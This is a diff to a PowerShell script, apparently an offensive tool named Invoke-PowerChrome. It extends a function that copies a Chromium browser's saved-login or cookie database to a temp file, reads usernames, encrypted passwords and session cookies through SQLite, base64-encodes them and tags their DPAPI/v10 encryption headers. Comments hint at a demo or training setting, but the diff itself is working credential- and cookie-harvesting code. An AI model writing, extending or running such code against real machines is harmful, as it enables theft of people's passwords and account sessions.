@@ -613,14 +613,13 @@ function Decrypt-ChromeKeyBlob {
         throw "[*] Unsupported flag: $($ParsedData.Flag)"
     }
 }
-
 function Get-ChromiumLoginBlobs {
     param(
         [string]$Browser,
-        [switch]$Cookies # Added this switch to handle cookies
+        [switch]$Cookies 
     )
 
-    # Determine which file to target based on the switch
+    # 1. Path Logic: Choose the right database file
     $TargetFile = if ($Cookies) { "Default\Network\Cookies" } else { "Default\Login Data" }
 
     switch ($Browser.ToLower()) {
@@ -634,10 +633,11 @@ function Get-ChromiumLoginBlobs {
 
     if (-not (Test-Path -Path $DataPath)) { return $false }
 
+    # 2. Setup SQLite constants
     [int]$SqliteOk = 0
     [int]$SqliteRow = 100
     [int]$SqliteOpenReadOnly = 1
-    $TempDatabasePath = Join-Path $env:TEMP ("$($Browser)_AuditData_{0}.db" -f ([guid]::NewGuid()))
+    $TempDatabasePath = Join-Path $env:TEMP ("$($Browser)_Audit_{0}.db" -f ([guid]::NewGuid()))
 
     try {
         Copy-Item -LiteralPath $DataPath -Destination $TempDatabasePath -Force -ErrorAction Stop
@@ -649,123 +649,79 @@ function Get-ChromiumLoginBlobs {
     $DatabasePointer = [IntPtr]::Zero
     $StatementPointer = [IntPtr]::Zero
 
-    # NEW LOGIC: Switch the SQL query based on the task
+    # 3. Dynamic SQL Query (This is where the magic happens)
+    # If -Cookies is used, we look for host/path/name. Otherwise, realm/url/user.
     if ($Cookies) {
-        $SqlQuery = 'SELECT host_key, host_key, name, encrypted_value FROM cookies'
+        $SqlQuery = 'SELECT host_key, path, name, encrypted_value FROM cookies'
     } else {
         $SqlQuery = 'SELECT signon_realm, origin_url, username_value, password_value FROM logins'
     }
 
-    $ResultCode = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
-    
-    # ... [The rest of the function code below this remains the same] ...
-
-    $DatabasePointer = [IntPtr]::Zero
-    $StatementPointer = [IntPtr]::Zero
-
-    # NEW LOGIC: Switch the SQL query based on the task
-    if ($Cookies) {
-        $SqlQuery = 'SELECT host_key, host_key, name, encrypted_value FROM cookies'
-    } else {
-        $SqlQuery = 'SELECT signon_realm, origin_url, username_value, password_value FROM logins'
-    }
-
-    $ResultCode = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
-    
-    # ... [The rest of the function code below this remains the same] ...
-
-    $DatabasePointer    = [IntPtr]::Zero
-    $StatementPointer   = [IntPtr]::Zero
-    $LoginSqlQuery      = 'SELECT signon_realm, origin_url, username_value, password_value FROM logins'
-
+    # 4. Open and Prepare Database
     $ResultCode = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
     if ($ResultCode -ne $SqliteOk) {
-        $ErrorMessagePointer = $Sqlite3ErrMsg.Invoke($DatabasePointer)
-        $ErrorMessage        = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ErrorMessagePointer)
-        return "[-] sqlite3_open_v2 failed ($ResultCode): $ErrorMessage"
+        return "[-] SQLite Open Failed: $ResultCode"
     }
 
-    $ResultCode = $Sqlite3PrepareV2.Invoke($DatabasePointer, $LoginSqlQuery, -1, [ref]$StatementPointer, [IntPtr]::Zero)
+    $ResultCode = $Sqlite3PrepareV2.Invoke($DatabasePointer, $SqlQuery, -1, [ref]$StatementPointer, [IntPtr]::Zero)
     if ($ResultCode -ne $SqliteOk) {
-        $ErrorMessagePointer = $Sqlite3ErrMsg.Invoke($DatabasePointer)
-        $ErrorMessage        = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ErrorMessagePointer)
-        return "[-] sqlite3_prepare_v2 failed ($ResultCode): $ErrorMessage"
+        return "[-] SQLite Prepare Failed: $ResultCode"
     }
 
-    $LoginResults = @()
+    $Results = @()
+
+    # 5. Extraction Loop
     while ($Sqlite3Step.Invoke($StatementPointer) -eq $SqliteRow) {
-        $ActionUrlPointer   = $Sqlite3ColumnText.Invoke($StatementPointer, 0)
-        $OriginUrlPointer   = $Sqlite3ColumnText.Invoke($StatementPointer, 1)
-        $UsernamePointer    = $Sqlite3ColumnText.Invoke($StatementPointer, 2)
-        $PasswordPointer    = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3)
-        $PasswordSize       = $Sqlite3ColumnByte.Invoke($StatementPointer, 3)
+        $Col0Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 0) # Host or Realm
+        $Col1Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 1) # Path or URL
+        $Col2Ptr = $Sqlite3ColumnText.Invoke($StatementPointer, 2) # Name or Username
+        $BlobPtr = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3) # Encrypted Data
+        $BlobSize = $Sqlite3ColumnByte.Invoke($StatementPointer, 3)
 
-        $ActionUrl  = if ($ActionUrlPointer -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ActionUrlPointer) } else { "" }
-        $OriginUrl  = if ($OriginUrlPointer -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($OriginUrlPointer) } else { "" }
-        $Username   = if ($UsernamePointer  -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($UsernamePointer)  } else { "" }
-        $Url = if ($ActionUrl) { $ActionUrl } else { $OriginUrl }
-        if (-not $Url) { continue }
+        $Val0 = if ($Col0Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col0Ptr) } else { "" }
+        $Val1 = if ($Col1Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col1Ptr) } else { "" }
+        $Val2 = if ($Col2Ptr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Col2Ptr) } else { "" }
+        
+        # Use Host/Realm if available, otherwise URL/Path
+        $SourceUrl = if ($Val0) { $Val0 } else { $Val1 }
+        if (-not $SourceUrl) { continue }
 
-        $RawPasswordData = @()
-        if ($PasswordSize -gt 0 -and $PasswordPointer -ne [IntPtr]::Zero) {
-            $RawPasswordData = New-Object byte[] $PasswordSize
-            [Runtime.InteropServices.Marshal]::Copy($PasswordPointer, $RawPasswordData, 0, $PasswordSize)
+        $RawData = @()
+        if ($BlobSize -gt 0 -and $BlobPtr -ne [IntPtr]::Zero) {
+            $RawData = New-Object byte[] $BlobSize
+            [Runtime.InteropServices.Marshal]::Copy($BlobPtr, $RawData, 0, $BlobSize)
         }
 
-        if ($RawPasswordData.Length -eq 0) { continue }
+        if ($RawData.Length -eq 0) { continue }
 
-        $Header3 = [Text.Encoding]::ASCII.GetString($RawPasswordData, 0, [Math]::Min(3, $RawPasswordData.Length))
-        $Header5 = [Text.Encoding]::ASCII.GetString($RawPasswordData, 0, [Math]::Min(5, $RawPasswordData.Length))
+        $Header3 = [Text.Encoding]::ASCII.GetString($RawData, 0, [Math]::Min(3, $RawData.Length))
+        $Header5 = [Text.Encoding]::ASCII.GetString($RawData, 0, [Math]::Min(5, $RawData.Length))
+        $Type = if ($Header5 -eq "DPAPI") { "DPAPI" } elseif ($Header3 -eq "v10") { "v10" } else { "Other" }
 
-        $BlobHeaderType =
-        if      ($Header5 -eq "DPAPI")  { "DPAPI (legacy)" }
-        elseif  ($Header3 -eq "v10")    { "v10 (DPAPI user)" }
-        elseif  ($Header3 -eq "v20")    { "v20 (ABE)" }
-        else    { "Unknown" }
-
-        $LoginResults += [PSCustomObject]@{
-            Browser                 = $Browser
-            URL                     = $Url
-            Username                = $Username
-            BlobHeader              = $BlobHeaderType
-            Base64EncryptedPassword = [Convert]::ToBase64String($RawPasswordData)
+        # Add to the final list
+        $Results += [PSCustomObject]@{
+            Browser    = $Browser
+            URL        = $SourceUrl
+            Identifier = $Val2 # This will be the Username or the Cookie Name
+            BlobHeader = $Type
+            Base64Data = [Convert]::ToBase64String($RawData)
         }
     }
 
-# 1. Close the statement and database
-    if ($StatementPointer -ne [IntPtr]::Zero) {
-        $null = $Sqlite3Finalize.Invoke($StatementPointer)
-        $StatementPointer = [IntPtr]::Zero
-    }
-    if ($DatabasePointer -ne [IntPtr]::Zero) {
-        $null = $Sqlite3Close.Invoke($DatabasePointer)
-        $DatabasePointer = [IntPtr]::Zero
-    }
+    # 6. Cleanup Logic (The "Safe" Way)
+    if ($StatementPointer -ne [IntPtr]::Zero) { [void]$Sqlite3Finalize.Invoke($StatementPointer) }
+    if ($DatabasePointer -ne [IntPtr]::Zero) { [void]$Sqlite3Close.Invoke($DatabasePointer) }
 
-    # 2. Aggressive Memory Release (The "CSIT Way")
-    # This forces the .NET environment to release the DLL handle immediately
-    [System.Runtime.InteropServices.Marshal]::ReleaseComObject([System.Object]$DatabasePointer) | Out-Null
-    [System.Runtime.InteropServices.Marshal]::ReleaseComObject([System.Object]$StatementPointer) | Out-Null
-    
     [GC]::Collect()
     [GC]::WaitForPendingFinalizers()
-    
-    # 3. Small delay to allow the file system to unlock
-    Start-Sleep -Milliseconds 800
+    Start-Sleep -Milliseconds 500
 
-    # 4. Attempt deletion with a "SilentlyContinue" fallback
     if (Test-Path $TempDatabasePath) {
-        try {
-            Remove-Item -Path $TempDatabasePath -Force -ErrorAction Stop
-        }
-        catch {
-            # This prevents the red error text from appearing in your demo
-            Write-Host "[!] Note: Temporary database file is still being released by the system." -ForegroundColor Gray
-        }
+        Remove-Item -Path $TempDatabasePath -Force -ErrorAction SilentlyContinue
     }
-    
-    return $LoginResults
-} # <--- THIS BRACE CLOSES THE FUNCTION. DO NOT REMOVE IT.
+
+    return $Results
+}
 
 # The script should then continue to the next part, like:
 # function Invoke-PowerChrome { ...
@@ -835,7 +791,7 @@ if (-not ($Browser)){
     # ------------------------------------------------------------------
     
     Log "Running Collection..."
-    $BrowserData = Get-ChromiumLoginBlobs -Browser $Browser
+    $BrowserData = Get-ChromiumLoginBlobs -Browser $Browser -Cookies:$Cookies
 
     if (-not $BrowserData) {
         Write-Output "[-] No browser data found for $($Browser.ToUpper())"
